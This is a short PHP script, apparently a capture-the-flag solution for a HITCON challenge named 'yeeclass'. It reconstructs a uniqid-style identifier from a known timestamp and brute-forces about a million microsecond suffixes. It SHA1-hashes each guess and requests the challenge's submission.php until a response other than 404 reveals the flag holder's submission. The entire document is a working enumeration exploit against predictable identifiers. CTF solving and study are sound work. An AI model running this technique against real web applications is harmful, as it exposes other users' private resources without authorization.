<?php 

// unix timestamp of the FLAG insertion
$m=1669454106;
$xd = sprintf("%8x%05x\n",floor($m),($m-floor($m))*1000000);
echo $m."\n";
echo $xd."\n";
$brute=substr($xd, 0, 8);
echo $brute."\n";

// Brute force the seconds
for($x = 0;$x <= 0xfffff;$x++){
    $my=sprintf("%05x", $x);
    $z=$brute.$my;
    $ba="flagholder_".$z;
    $h=hash("sha1", $ba);
    $res= get_headers("http://yeeclass.chal.hitconctf.com:16875/
    submission.php?hash=".$h);
    $status=substr($res[0],9, 3);
    if( $status != "404" ){
        echo $ba."-".$res[0]."\n";
    }
}
?>
